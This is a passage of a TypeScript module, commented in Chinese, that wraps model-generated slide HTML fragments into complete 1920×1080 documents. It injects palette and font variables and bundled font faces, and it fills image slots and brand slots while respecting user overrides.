import { IMAGE_SLOT_ATTR } from './style-doc.js';
import type { StylePalette } from './style-doc.js';
import { BRAND_SLOT_ATTR, BRAND_SLOT_KINDS, type BrandSlot, type BrandSlotKind } from './brand.js';
import { fillChartSlots } from './chart-fill.js';
import type { ChartRenderFn } from './chart-slot.js';

/**
 * 把「模型产出的一页 HTML 片段」装配成一份完整文档。
 *
 * 片段是模型给的：一个 `<style>` 加若干 `<div>`，不含 `<html>`/`<body>` 骨架。
 * 三处要在这里补齐，且三处都必须在**每一处渲染**里做（编辑器、演示、导出、样机），
 * 少一处就会出现「编辑器里好好的，导出来不对」。
 *
 * 1. **骨架**：补 `<html>/<head>/<body>`、字符集、以及把画布钉死成 1920×1080。
 *    画布固定是这套系统的根约束：所有尺寸都按 1920 宽算，靠外层缩放适配容器。
 * 2. **变量兜底**：在片段之前先写一份 `:root`。模型自己那份会覆盖它（同在 :root 里，
 *    后声明的赢），所以这只是「模型漏写了某个变量」时的保险，不会篡改它的配色。
 * 3. **填图位**：把 `<img data-lumen-image="n">` 补上 `src`。提示词里要求模型不写 src，
 *    这样同一条提示词换一套图还能用。
 */

/** 画布尺寸。与 design-system 的 tokens 一致 */
export const CANVAS_WIDTH = 1920;
export const CANVAS_HEIGHT = 1080;

/**
 * 一张要落进图位的图。
 *
 * 用对象而不是裸字符串：透明底抠图与照片的**落图方式不同**（见 `IMAGE_SLOT_CSS`），
 * 而 `fillImageSlots` 只看得到 URL——从 `/stock/cutout-1.png` 这种路径去猜是不是抠图，
 * 是把文件名当契约用，改一次命名就全线失效。
 */
export interface StockImage {
  src: string;
  /** 透明底抠图。落图时不裁切，让透明物体整个浮在页面上 */
  cutout?: boolean;
}

/** 把配色写成一串 CSS 自定义属性 */
export function paletteVars(palette: StylePalette): string {
  return [
    `--bg: ${palette.bg};`,
    `--surface: ${palette.surface};`,
    `--text: ${palette.text};`,
    `--muted: ${palette.muted};`,
    `--accent: ${palette.accent};`,
    `--brand: ${palette.brand};`,
    `--border: ${palette.border};`,
  ].join(' ');
}

/**
 * 展示字体、手写体、数字三个变量。
 *
 * **一定要注入，哪怕调用点没给**：骨架里写的是 `font-family:var(--font-display)`，
 * 变量没定义的话这条声明在计算值阶段就是无效的、整个属性退回继承——看着像「骨架的字体
 * 不起作用」，而不是「这套风格没设展示字体」。所以空值一律落回上一个角色。
 *
 * `--font-numeric` 落在展示字体上而不是正文：指标值、大号序号按标题那套排是常态，
 * 落回正文会让它们看着像一段放大的说明文字。
 */
export function fontVars(
  opts: Pick<PageDocumentOptions, 'fontFamily' | 'fontDisplay' | 'fontScript' | 'fontNumeric'>,
): string {
  const display = opts.fontDisplay?.trim();
  const script = opts.fontScript?.trim();
  const numeric = opts.fontNumeric?.trim();
  return [
    `--font-display: ${display || 'var(--font-sans)'};`,
    `--font-script: ${script || 'var(--font-display)'};`,
    `--font-numeric: ${numeric || 'var(--font-display)'};`,
  ].join(' ');
}

/**
 * 随仓库分发的拉丁字体。
 *
 * ## 为什么要有这一份
 *
 * 默认字体栈是一串系统字体名，开头几个还是中文宋体（`Songti SC` / `STSong` /
 * `Noto Serif SC`）——Windows 上一个都没有，于是英文大标题**静默落到 Georgia**。
 * 同一个产品在 mac 与 Windows 上排出来不一样，而「高级不高级」全在字形上，
 * 靠系统字体是靠不住的。
 *
 * ## 为什么只声明 latin 子集
 *
 * 下下来的就是 Google 切好的 latin 那一份（见 `scripts/fetch-fonts.ts`）：
 * 中文由字体栈后面的系统字体接手。把中日韩字形也带上只会让每个文件大好几倍，
 * 而一个都用不到。
 *
 * ## 地址写成 `/fonts/x.woff2`
 *
 * 由 api 静态托管（与 `/stock` 同一条路），web 与 admin 反代到那里，
 * 于是浏览器里这几个文件只有一个真身、所有 iframe 共用一份缓存。
 * **导出时由 `apps/worker` 的 `inlineFileUrls` 换成 data URL**——
 * 成品要自包含，否则用户发出去、或换台机器打开，字形就退回系统字体了。
 */
export const BUNDLED_FACES: { family: string; file: string; weight: string }[] = [
  { family: 'Cormorant Garamond', file: 'cormorant-garamond-400.woff2', weight: '400' },
  /*
    700 那一档声明成 `700 900` 是**有意为之**：Cormorant Garamond 最高只到 700，
    而骨架里大标题常写 900。把区间开到 900，浏览器就不会去**合成**粗体——
    合成粗体是把笔画整体加粗，而这种高对比衬线的贵气恰恰在发丝一样的细笔画上，
    一加粗就糊了。
  */
  { family: 'Cormorant Garamond', file: 'cormorant-garamond-700.woff2', weight: '700 900' },
  { family: 'Montserrat', file: 'montserrat-400.woff2', weight: '400' },
  { family: 'Montserrat', file: 'montserrat-600.woff2', weight: '600' },
  { family: 'Montserrat', file: 'montserrat-800.woff2', weight: '800' },
];

/**
 * `@font-face` 那一块。
 *
 * `font-display: swap`：字体没到之前先用系统字体顶上，不要把整页文字藏起来——
 * 出片时是等 `document.fonts.ready` 的，所以导出拿到的一定是真字体。
 */
export function bundledFontFaceCss(urlBase = '/fonts'): string {
  return BUNDLED_FACES.map((f) =>
    `@font-face{font-family:"${f.family}";font-style:normal;font-weight:${f.weight};`
    + `font-display:swap;src:url("${urlBase}/${f.file}") format("woff2")}`,
  ).join('\n');
}

/**
 * 一段片段要几张图。
 *
 * **取「最大下标」与「图位个数」里较大的那个**，两条都要，缺一条就会漏：
 * - 只数图位个数：模型写 `<img data-lumen-image="2">` 却漏了 "1" 时只算 1 张，
 *   第二个图位拿不到图。
 * - 只取最大下标：模型在图片排版页上常把五个图位**都写成 "1"**（实测过），
 *   最大下标是 1，于是只取一张图——整页重复同一张画面。
 *
 * 宁可多取：多取的那张没人用，少取的那几个图位会变成占位块。
 * **这条规则必须与 `fillImageSlots` 的取图规则一致**，两者挨着放就是为了这个。
 */
export function imageSlotCount(fragment: string): number {
  const re = new RegExp(`${IMAGE_SLOT_ATTR}\\s*=\\s*["']?(\\d+)`, 'gi');
  let max = 0;
  let tags = 0;
  for (const m of fragment.matchAll(re)) {
    const n = Number(m[1]);
    if (Number.isFinite(n) && n > max) max = n;
    tags += 1;
  }
  return Math.max(max, tags);
}

/**
 * 一个图位的调整。
 *
 * **key 是图位在片段里出现的次序（从 0 起），不是模型写的那个 `data-lumen-image="n"`。**
 * 模型在图片排版页上会把五个图位都写成 "1"（实测过），拿那个数字当 key 的话，
 * 用户调一次会同时改到五张图。次序是唯一的。
 *
 * 存的地方是 `PageIR.overrides.images`（`overrides` 本来就是 `z.record(z.unknown())`）。
 * **不改模型写的 HTML**：那是重生成的产物，直接改不可逆；而且 `fillImageSlots`
 * 本来就会覆盖图位上写着的 `src`，写进去也活不下来。
 */
export interface ImageSlotOverride {
  /** 换成这一张 */
  src?: string;
  /** 透明底。true 时落图不裁切，false 时按普通照片裁 */
  cutout?: boolean;
  /** 这一页不要这张图。渲染时把这个元素整条移除，不留占位块 */
  hidden?: boolean;
  /**
   * 「重新生成」用的提示词。**渲染时不读它**，它只是把用户写过的这句话留在页面上，
   * 下次回来还能接着改。留空时由服务端按这一页的标题与主张现拼一句。
   */
  prompt?: string;
  /** 挪动图位本身（画布像素）。落成独立的 `translate` 属性，见下面 `geometryDecls` */
  dx?: number;
  dy?: number;
  /** 图位整体缩放，1 为原样 */
  scale?: number;
  /** 追加旋转（度） */
  rotate?: number;
}

/** 覆盖表：图位次序 → 调整。取不到的项一律当作「没调过」 */
export type ImageOverrides = Record<string, ImageSlotOverride>;

/**
 * 覆盖表里的数字字段只认**有限数**。
 *
 * 不这么做的话，`"dx": "20"`（字符串）、`"dx": null`、`"dx": NaN` 都会被当成有效值，
 * 一路拼进内联样式，最后是浏览器丢掉整条 `style` 声明——症状是「用户调了位置，
 * 画布上连原本的版式都塌了」，而报错在八竿子打不着的地方。
 */
function finiteNumber(v: unknown): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? v : undefined;
}

/**
 * 从 `page.overrides` 里挑出图片那一份。
 *
 * **逐项挑字段，不整块信任**：`overrides` 的 schema 是 `z.record(z.unknown())`，
 * 里面什么类型都可能躺着（历史数据、别的功能写的键），直接当 `ImageSlotOverride`
 * 用会在渲染时炸在一个八竿子打不着的地方。
 */
export function imageOverridesOf(overrides: unknown): ImageOverrides {
  if (!overrides || typeof overrides !== 'object') return {};
  const raw = (overrides as Record<string, unknown>)['images'];
  if (!raw || typeof raw !== 'object') return {};

  const out: ImageOverrides = {};
  for (const [key, value] of Object.entries(raw as Record<string, unknown>)) {
    if (!value || typeof value !== 'object') continue;
    const v = value as Record<string, unknown>;
    const item: ImageSlotOverride = {};
    if (typeof v['src'] === 'string' && v['src'].trim() !== '') item.src = v['src'];
    if (typeof v['cutout'] === 'boolean') item.cutout = v['cutout'];
    if (typeof v['hidden'] === 'boolean') item.hidden = v['hidden'];
    if (typeof v['prompt'] === 'string' && v['prompt'].trim() !== '') item.prompt = v['prompt'];
    const dx = finiteNumber(v['dx']);
    const dy = finiteNumber(v['dy']);
    const scale = finiteNumber(v['scale']);
    const rotate = finiteNumber(v['rotate']);
    if (dx !== undefined) item.dx = dx;
    if (dy !== undefined) item.dy = dy;
    if (scale !== undefined) item.scale = scale;
    if (rotate !== undefined) item.rotate = rotate;
    // 一个字段都没有的项不要留——它会在面板上显示成一个空壳图位
    if (Object.keys(item).length > 0) out[key] = item;
  }
  return out;
}

/** 一个图位现在的样子。面板据此列出「这一页有哪些图」 */
export interface ImageSlot {
  /** 图位在片段里出现的次序，从 0 起。**覆盖表的 key 就是它** */
  index: number;
  /** 模型写的那个数字（`data-lumen-image="n"`）。只用于显示 */
  slotNo: number;
  /** 落的是哪张图。图不够、或用户把它删了时为 null */
  src: string | null;
  cutout: boolean;
  hidden: boolean;
}

/** 片段里带 `data-lumen-image` 的标签（`<img>` 或图不够时的占位块），按出现次序 */
const SLOT_TAG_RE = /<(?:img|div)\b[^>]*\bdata-lumen-image\b[^>]*>/gi;

/** 骨架里的图位编号，升序。`data-lumen-image="n"` 的 n */
export function imageSlotNumbers(skeleton: string): number[] {
  const nums: number[] = [];
  const re = /data-lumen-image="(\d+)"/g;
  let m: RegExpExecArray | null = re.exec(skeleton);
  while (m !== null) {
    nums.push(Number(m[1]));
    m = re.exec(skeleton);
  }
  return nums.sort((a, b) => a - b);
}

function slotNoOf(tag: string): number | null {
  const m = new RegExp(`${IMAGE_SLOT_ATTR}\\s*=\\s*["']?(\\d+)`, 'i').exec(tag);
  if (!m) return null;
  const n = Number(m[1]);
  return Number.isFinite(n) ? n : null;
}

/**
 * 列出这一页的图位，以及每个图位**实际落的是哪张图**。
 *
 * 做法是**先按真实规则落一遍图、再读回来**，而不是另写一份「哪个图位拿第几张」的推算。
 * `html-doc.ts` 上面那条注释（「这条规则必须与 fillImageSlots 的取图规则一致」）
 * 之所以存在，就是因为曾经有过两份拷贝、改一边漏一边，症状是「人像位拿到普通照片、
 * 普通位拿到抠图」而页面上不报错。读回来就没有第二份可漏。
 */
export function imageSlotsOf(
  fragment: string,
  images: StockImage[],
  overrides: ImageOverrides = {},
): ImageSlot[] {
  const slots: ImageSlot[] = [];
  for (const m of fragment.matchAll(SLOT_TAG_RE)) {
    const no = slotNoOf(m[0]);
    if (no === null) continue;
    slots.push({ index: slots.length, slotNo: no, src: null, cutout: false, hidden: false });
  }
  if (slots.length === 0) return slots;

  const filled = fillImageSlots(fragment, images, overrides);
  const filledTags = [...filled.matchAll(SLOT_TAG_RE)].map((m) => m[0]);

  // 被删掉的图位在 filled 里已经没有了，所以两边要错位着走：
  // 按原次序过一遍，hidden 的跳过，其余的依次取 filled 里的下一个
  let at = 0;
  for (const slot of slots) {
    const ov = overrides[String(slot.index)] ?? {};
    if (ov.hidden) {
      slot.hidden = true;
      continue;
    }
    const tag = filledTags[at];
    at += 1;
    if (!tag) continue;
    const src = /\bsrc\s*=\s*["']([^"']*)["']/i.exec(tag)?.[1];
    slot.src = src && src.trim() !== '' ? src : null;
    slot.cutout = /\bdata-lumen-cutout\b/i.test(tag);
  }
  return slots;
}

/**
 * 给图片位补 src。填不上图的图位换成**有样式的占位块**。
 *
 * `images[n]` 对应 `data-lumen-image="n"`。下标从 **1** 开始——写提示词时
 * 「第 1 张图」比「第 0 张图」自然，模型也更少写错。
 *
 * **下标撞车时往后顺延。** 模型在图片排版页上会把几个图位都写成 "1"（实测过五连
 * "1"），按下标取图会让整页重复同一张画面——用户看到的是「同一张图贴了五遍」。
 * 声明过、已经用掉的下标就顺延到下一个没用过的，这样一组图位拿到的是互不相同的图。
 *
 * 顺延只在**声明下标本身落在可用范围内**时做：下标超出可用图数（模型多写了图位、
 * 而这一页确实没那么多图）维持原样，交给占位块——那时顺延只会把别的图挪过来，
 * 反而掩盖了「图不够」这件事。
 *
 * 填不上时不能把 `<img>` 原样留着：没有 src 的 img 在浏览器里是个破图标，
 * 比空白还难看。换成一个同尺寸的浅色占位块，页面看着仍是完整的。
 *
 * `overrides` 是用户在图位面板上做过的调整，**优先级高于素材库自动配的那张**。
 */
export function fillImageSlots(
  fragment: string,
  images: StockImage[],
  overrides: ImageOverrides = {},
): string {
  const used = new Set<number>();
  // 整页算一次：每个图位各算一遍是白费，而且它们看的是同一份 <style>
  const fits = objectFitByClass(fragment);
  const take = (want: number): StockImage | undefined => {
    if (images.length === 0) return undefined;
    if (want > images.length) return images[want - 1];
    // 从声明的下标往后找第一个没用过的；找到头就绕回前面接着找
    for (let i = want - 1; i < images.length; i++) {
      if (!used.has(i)) { used.add(i); return images[i]; }
    }
    for (let i = 0; i < want - 1; i++) {
      if (!used.has(i)) { used.add(i); return images[i]; }
    }
    return undefined;
  };

  let index = -1;
  return fragment.replace(/<img\b[^>]*>/gi, (tag) => {
    const no = slotNoOf(tag);
    if (no === null) return tag;
    index += 1;
    const ov = overrides[String(index)] ?? {};
    if (ov.hidden) return '';

    const picked = take(no);
    // 用户指定了就用他指定的；否则用素材库配的那张
    const chosen: StockImage | undefined = ov.src
      ? { src: ov.src, ...(ov.cutout === undefined ? {} : { cutout: ov.cutout }) }
      : picked;
    if (!chosen) return markSlotIndex(imagePlaceholder(tag, no), index);

    const withSrc = /\bsrc\s*=/i.test(tag)
      ? tag.replace(/\bsrc\s*=\s*["'][^"']*["']/i, `src="${chosen.src}"`)
      : tag.replace(/<img\b/i, `<img src="${chosen.src}"`);
    return decorate(markSlotIndex(markCutout(withSrc, chosen, ov, isCutoutSlot(tag, fits)), index), ov);
  });
}

/**
 * 把图位序号盖到元素上。
 *
 * 画布上的拖拽手柄是**按 DOM 元素**找图位的，而 `data-lumen-image="n"` 那个 n 是模型写的，
 * 不可靠——实测模型在图片排版页上把五个图位都写成 "1"。序号是 `fillImageSlots` 自己
 * 数出来的，与面板、与覆盖表用的是同一个数，盖上去之后三边不可能对不上。
 *
 * 被删掉的图位在文档里根本不存在，所以序号会跳号——这是对的，手柄要按序号找覆盖项。
 */
function markSlotIndex(tag: string, index: number): string {
  if (/\bdata-lumen-slot\s*=/i.test(tag)) return tag;
  return tag.replace(/<(img|div)\b/i, `<$1 data-lumen-slot="${index}"`);
}

/**
 * 把用户在图位面板上做的位置调整落到内联样式上。
 *
 * ## 位置为什么用独立的 `translate` / `scale` / `rotate` 属性
 *
 * 不能用 `transform` 简写。模型很爱写 `transform: translate(-50%,-50%)` 来居中
 * （`STAGGER_CSS` 那份注释里记着同一个坑），简写是**整体替换**的，我们写进去就把
 * 它的居中抹掉了——图会突然跑到右下角，而页面上不报任何错。
 *
 * 独立的 `translate` / `rotate` / `scale` 是三个额外通道，与 `transform` 叠加而不是
 * 覆盖它（合成顺序是 translate → rotate → scale → transform），正好是「在模型摆好的
 * 位置上再挪一点」。
 */
function decorate(tag: string, ov: ImageSlotOverride): string {
  const decls = geometryDecls(ov);
  return decls.length === 0 ? tag : appendStyle(tag, decls.join('; '));
}

function geometryDecls(ov: ImageSlotOverride): string[] {
  const out: string[] = [];
  if (ov.dx !== undefined || ov.dy !== undefined) {
    out.push(`translate: ${px(ov.dx ?? 0)}px ${px(ov.dy ?? 0)}px`);
  }
  if (ov.rotate !== undefined) out.push(`rotate: ${px(ov.rotate)}deg`);
  if (ov.scale !== undefined) out.push(`scale: ${px(ov.scale)}`);
  return out;
}

/**
 * 把声明追加进标签的 `style`。
 *
 * 原来没有 `style` 就新加一个；有就在末尾接着写（追加在后面 = 优先级更高，
 * 所以用户调过的值压得住模型写在同一属性上的旧值）。
 */
function appendStyle(tag: string, decls: string): string {
  const m = /\bstyle\s*=\s*["']([^"']*)["']/i.exec(tag);
  if (!m) return tag.replace(/<img\b/i, `<img style="${decls}"`);
  const own = (m[1] ?? '').trim().replace(/;\s*$/, '');
  const merged = own === '' ? decls : `${own}; ${decls}`;
  // 用函数式替换：decls 里万一出现 `$&` 之类会被当成替换模式，虽然现在不可能，
  // 但这条路的输入是用户数据，不值得赌
  return tag.replace(m[0], () => `style="${merged}"`);
}

/** 数字进样式表前统一收一下：`1` 不要写成 `1.0000`，`0.5` 不要写成 `0.5000000001` */
const px = (n: number): string => String(Math.round(n * 100) / 100);

/**
 * 一页里「class 名 → 这个 class 规则里最后一条 `object-fit` 的值」。
 *
 * **刻意只认最简单的选择器**：`.foo` 与 `img.foo`（含逗号列表）。后代选择器
 * （`.hero img`）、子选择器、伪类、`!important`、优先级计算一律不看。
 *
 * 理由是**两类错误的代价不对称**：漏判只是让这个图位维持现状（当普通照片配图），
 * 误判会把一张普通照片的图位当成抠图位、从透明底池里塞一张不贴题的图进去。
 * 所以宁可漏。要按真正的级联算，得把浏览器那套搬过来，代价远大于收益。
 */
export function objectFitByClass(fragment: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const block of fragment.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi)) {
    /**
     * 注释先去掉。**它防的是漏判，不是误判**——注释里那句 `object-fit: contain` 本来
     * 就匹配不上（取值正则前面有 `(?:^|;)`，而注释前面是 `/`）。真正会坏的是注释
     * **夹在规则前面**时：`/* x *\/ .a{object-fit:contain}` 不剥的话，选择器整段变成
     * `/* x *\/ .a`，过不了「最简单选择器」那条判据，`.a` 就整个丢了。
     */
    const css = (block[1] ?? '').replace(/\/\*[\s\S]*?\*\//g, '');
    for (const rule of css.matchAll(/([^{}]+)\{([^}]*)\}/g)) {
      const fit = /(?:^|;)\s*object-fit\s*:\s*([\w-]+)/i.exec(rule[2] ?? '')?.[1];
      if (!fit) continue;
      for (const part of (rule[1] ?? '').split(',')) {
        const m = /^(?:[a-z][\w-]*)?\.([\w-]+)$/i.exec(part.trim());
        // 后出现的规则赢——同一层级的选择器里，CSS 就是这么定的
        if (m?.[1]) out[m[1].toLowerCase()] = fit.toLowerCase();
      }
    }
  }
  return out;
}

/**
 * 这个图位要不要透明底。
 *
 * 两条判据，**显式标记优先**：模型写了 `data-lumen-cutout` 就听它的；否则看样式里
 * 有没有 `object-fit: contain`——内联的压过 class 规则的。
 *
 * 为什么必须看 class 规则：实测暖调纸感那套风格的封面，图位是
 * `<img class="leaf" data-lumen-image="1">`，而 `contain` 写在页面那段 `<style>` 的
 * `.leaf { … }` 里，**不是内联**。只看内联会漏掉整个存量页面。
 *
 * `fits` 由 `objectFitByClass(fragment)` 算一次传进来——它是整页一份的，
 * 每个图位各算一遍是白费。
 */
export function isCutoutSlot(tag: string, fits: Record<string, string>): boolean {
  // 看的是「有没有这个属性」，不是它的值——`data-lumen-cutout="0"` 也判成 true。
  // 与 `markCutout`、`imageSlotsOf` 一致，且这个标记只会被写成 "1"，所以无影响
  if (/\bdata-lumen-cutout\b/i.test(tag)) return true;
  const inline = /\bstyle\s*=\s*["']([^"']*)["']/i.exec(tag)?.[1];
  if (inline) {
    const own = /(?:^|;)\s*object-fit\s*:\s*([\w-]+)/i.exec(inline)?.[1];
    // 内联写了就以内联为准：它压得过 class 规则，不能再回头去看 class
    if (own) return own.toLowerCase() === 'contain';
  }
  const cls = /\bclass\s*=\s*["']([^"']*)["']/i.exec(tag)?.[1];
  if (!cls) return false;
  return cls.split(/\s+/).some((c) => fits[c.toLowerCase()] === 'contain');
}

/**
 * 图位要哪种取景。人物页专用。
 *
 * 素材分两套（`head` 头肩、`half` 头到腰/胯），图位自己声明要哪种，
 * 配图时从对应池子里挑——**这样「头像位真的取到头、半身位真的取到半身」
 * 是靠取图保证的，不靠骨架里写死的百分比裁切**。后者在源图姿势不齐时必然落偏。
 *
 * 认不出（老页面写的 `"1"`、或压根没写）返回 `null`，调用方按 `half` 兜底：
 * 头肩图放进半身位会显得空，半身图放进头像位只是裁得紧一点，兜底往宽的那边倒更安全。
 */
export function framingOf(tag: string): 'head' | 'half' | null {
  const m = /\bdata-lumen-cutout\s*=\s*["']?(head|half)\b/i.exec(tag);
  return m ? (m[1]!.toLowerCase() as 'head' | 'half') : null;
}

/**
 * 抠图落成 `object-fit: contain` 的依据。
 *
 * 模型给图位写的样式多半是照片的写法（`object-fit: cover` 配一个定宽定高的框），
 * 透明物体套进去会被裁掉边缘。标个属性，由 `IMAGE_SLOT_CSS` 统一压过去。
 *
 * 三个来源，**优先级从高到低**：用户在图位面板上明确指定过 → 这个图位自己声明了
 * 要透明底（`data-lumen-cutout`，或样式里的 `object-fit: contain`）→ 选中的那张图
 * 本身是透明底。用户明确说「这张不要当抠图」时要能把标记**摘掉**，否则点了没反应。
 */
function markCutout(tag: string, image: StockImage, ov: ImageSlotOverride, declared: boolean): string {
  const want = ov.cutout ?? (declared || image.cutout === true);
  const has = /\bdata-lumen-cutout\b/i.test(tag);
  if (want === has) return tag;
  if (want) return tag.replace(/<img\b/i, '<img data-lumen-cutout="1"');
  return tag
    .replace(/\s+data-lumen-cutout\s*=\s*["'][^"']*["']/i, '')
    .replace(/\s+data-lumen-cutout\b/i, '');
}

/**
 * 占位块。**尽量沿用原 img 自己的内联样式**，这样它在版式里占的位置、
 * 圆角、宽高比都不变——换成占位块只是换了个内容，不是换了个版式。
 *
 * `data-lumen-image` 要留在占位块上：图位面板靠它把这一个图位也列出来
 * （列不出来，用户就看不到「这里本来该有张图、只是图不够」）。
 *
 * **class 要并成一个属性**，不能写成 `class="lumen-image-slot" class="leaf"`——
 * 重复的 class 属性浏览器只认第一个，模型自己的类名会被整条丢掉，
 * 那个图位的定位、尺寸全塌。
 */
function imagePlaceholder(tag: string, slotNo: number): string {
  const style = /\bstyle\s*=\s*["']([^"']*)["']/i.exec(tag)?.[1] ?? '';
  const cls = /\bclass\s*=\s*["']([^"']*)["']/i.exec(tag)?.[1] ?? '';
  const classes = ['lumen-image-slot', cls].filter((c) => c.trim() !== '').join(' ');
  return `<div class="${classes}" ${IMAGE_SLOT_ATTR}="${slotNo}"${style ? ` style="${style}"` : ''}></div>`;
}

/** 占位块的外观。由装配层统一注入，模型不用管 */
const IMAGE_SLOT_CSS = [
  '.lumen-image-slot {',
  '  background: repeating-linear-gradient(45deg,',
  '    color-mix(in srgb, var(--muted) 8%, transparent) 0 10px,',
  '    color-mix(in srgb, var(--muted) 16%, transparent) 10px 20px);',
  '  border: 1px solid var(--border);',
  '  min-width: 40px; min-height: 40px;',
  '}',
  // 抠图不裁切。`!important` 是必需的——模型把 object-fit 写在内联 style 上，
  // 样式表规则压不过内联样式，不加就是「规则写了但没生效」
  //
  // 三个取值都要匹配：`"head"` / `"half"` 是现在的写法，`"1"` 是老的（已经生成过的
  // 页面里全是它，改了那些页面就成了「人物被裁掉边缘」）
  'img[data-lumen-cutout="1"], img[data-lumen-cutout="head"], img[data-lumen-cutout="half"]',
  '  { object-fit: contain !important; }',
].join('\n');

/* ---------------- 品牌槽位 ---------------- */

/**
 * 填品牌槽位：`data-lumen-brand="logo|name|tagline"`。
 *
 * 与图位（`fillImageSlots`）同一套做法，但**只换元素内容、不换标签**——模型写的标签名、
 * class 与内联样式都留着，于是尺寸、颜色、字距跟着这套风格的规范走，不用我们另写一套。
 *
 * 模型的 HTML 是**不可信输入**，四条自保的规矩（都是实测踩出来的）：
 *
 * 1. **只认属性名，不认字符串。** 属性段按属性语法拆，`title="用 data-lumen-brand=logo 标记"`
 *    里的那一段不算命中——否则一个无关的 div 会被整块换成 logo。
 * 2. **取值只认三种。** 不是 logo / name / tagline 就原样不动，绝不删元素：模型把标记挂错
 *    容器、或随手写个 `"header"` 这种描述性取值，都很常见。
 * 3. **找不到配对闭合标签就跳过这个槽位。** 模型漏写 `</span>` 时，若默认「吃到片段末尾」，
 *    那之后的正文会被整页吞掉。宁可少填一个槽位，也不能吃掉正文——`markStaggerItems`
 *    里的同类取舍也是这条（「宁可少标，也不能让栈错位」）。
 * 4. **logo 槽填的是 `<img>`，稿本身绝不内联。** 单色稿的颜色在**这里**烘进去
 *    （`colorizeSvg` 把 `currentColor` 换成品牌色），不靠 CSS 继承——理由见 `colorizeSvg`。
 *    品牌名与标语仍然是纯文本，且**不带任何内联颜色**：它们的配色归这套风格的规范管
 *    （「深蓝渐变商务风」的品牌名规范色是 muted 而不是 brand），一条内联样式就会把它盖掉。
 */
export function fillBrandSlots(fragment: string, brand: BrandSlot, brandColor: string): string {
  const tagRe = /<([a-zA-Z][\w-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

  interface Hit {
    kind: BrandSlotKind;
    start: number;
    openEnd: number;
    /** 闭合标签的起点。空元素时等于 openEnd */
    closeStart: number;
    end: number;
    voidTag: boolean;
  }
  const hits: Hit[] = [];

  let m: RegExpExecArray | null;
  while ((m = tagRe.exec(fragment)) !== null) {
    const tag = (m[1] ?? '').toLowerCase();
    const attrs = m[2] ?? '';
    const kind = attrValue(attrs, BRAND_SLOT_ATTR);
    if (kind === null || !isSlotKind(kind)) continue;

    const start = m.index;
    const openEnd = m.index + m[0].length;
    const voidTag = attrs.trimEnd().endsWith('/') || VOID_TAGS.has(tag);

    if (voidTag) {
      hits.push({ kind, start, openEnd, closeStart: openEnd, end: openEnd, voidTag });
      continue;
    }

    const close = findClose(fragment, tag, openEnd);
    // 漏写闭合标签：这个槽位一个字都不动，后面的内容也就不会被吞掉
    if (close === null) continue;

    hits.push({ kind, start, openEnd, closeStart: close.start, end: close.end, voidTag });
    tagRe.lastIndex = close.end;
  }

  // 从后往前改，前面的下标才不会被位移带偏
  let out = fragment;
  for (const hit of hits.reverse()) {
    const value = slotValue(hit.kind, brand, brandColor);
    const open = out.slice(hit.start, hit.openEnd);

    if (value === null) {
      out = out.slice(0, hit.start) + out.slice(hit.end);
      continue;
    }
    if (hit.voidTag) {
      // 空元素装不下内容，整条换成 span；标签名丢了，但 class 与 style 带过去
      out = out.slice(0, hit.start) + spanFrom(open) + value + '</span>' + out.slice(hit.end);
      continue;
    }
    // 只换内容：开标签与闭合标签原样留着
    out = out.slice(0, hit.start) + rebuildOpen(open) + value + out.slice(hit.closeStart);
  }
  return out;
}

const isSlotKind = (v: string): v is BrandSlotKind =>
  (BRAND_SLOT_KINDS as readonly string[]).includes(v);

/**
 * 按属性语法拆开标签的属性段，取出名为 `name` 的属性的值。
 *
 * **必须这样拆**，不能用「在属性段里搜 `data-lumen-brand=` 这个子串」——那样
 * `title="用 data-lumen-brand=logo 标记"` 里的那一段也会命中，
 * 于是一个无关的 div 会被整块换成 logo（实测踩过）。
 */
function attrValue(attrs: string, name: string): string | null {
  const re = /([a-zA-Z_:][\w:.-]*)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s"'>]+))?/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(attrs)) !== null) {
    if ((m[1] ?? '').toLowerCase() !== name) continue;
    const raw = m[2];
    if (raw === undefined) return '';
    return raw[0] === '"' || raw[0] === "'" ? raw.slice(1, -1) : raw;
  }
  return null;
}

/**
 * 从 `from` 起找 `<tag>` 的配对闭合标签。**找不到就返回 `null`**——
 * 调用方据此跳过，而不是假设它一直延伸到片段末尾。
 */
function findClose(fragment: string, tag: string, from: number): { start: number; end: number } | null {
  const re = new RegExp(`<(/?)${tag}\\b((?:"[^"]*"|'[^']*'|[^>"'])*)>`, 'gi');
  re.lastIndex = from;
  let depth = 1;
  let m: RegExpExecArray | null;
  while ((m = re.exec(fragment)) !== null) {
    if ((m[2] ?? '').trimEnd().endsWith('/')) continue; // 自闭合的不算一层
    depth += m[1] === '/' ? -1 : 1;
    if (depth === 0) return { start: m.index, end: m.index + m[0].length };
  }
  return null;
}

/**
 * 摘掉槽位属性本身——它是脚手架，不该出现在成品里。
 *
 * 前置允许是空白、引号或串首：模型漏写空格时（`class="b"data-lumen-brand="logo"`）也要摘掉。
 * 带 `g` 是为了重复属性（模型偶尔把同一个属性写两遍，只摘第一处会漏一个进成品）。
 *
 * **收尾要按边界分情况**，不能一律 `'$1'`：边界是引号时必须放回，否则会把上一个属性
 * 的收尾引号一起吃掉（`class="b` 变成没闭合）；边界是空白时**不能**放回，
 * 否则 `>` 前会留一个杂散空格，`<div class="a" >` 与 `<div class="a">` 就不再是同一个字符串。
 */
function withoutSlotAttr(attrs: string): string {
  return attrs.replace(
    /(^|[\s"'])data-lumen-brand\s*=\s*("[^"]*"|'[^']*'|[^\s"'>]+)/gi,
    (_all, boundary: string) => (boundary === '"' || boundary === "'" ? boundary : ''),
  );
}

/**
 * 供空元素换成 span 时用。
 *
 * `class` 与 `style` 直接搬；**`width` / `height` 这两个 HTML 属性要转成内联尺寸**——
 * 它们在 `<img>` 上是有效的尺寸声明，换到 `<span>` 上就不再有效。不转的话，
 * 模型写的 `<img width="34" height="34">` 尺寸会整个丢掉，SVG 退回自身默认大小。
 */
function spanFrom(open: string): string {
  const attrs = withoutSlotAttr(openAttrs(open));
  const id = attrValue(attrs, 'id');
  const cls = attrValue(attrs, 'class');
  // HTML 的 width/height 属性既可以是数字（`34` → `34px`），也可以是百分比（`50%` → `50%`）
  const dim = (v: string | null) => {
    const t = v?.trim() ?? '';
    if (/^\d+$/.test(t)) return `${t}px`;
    return /^\d+(\.\d+)?%$/.test(t) ? t : '';
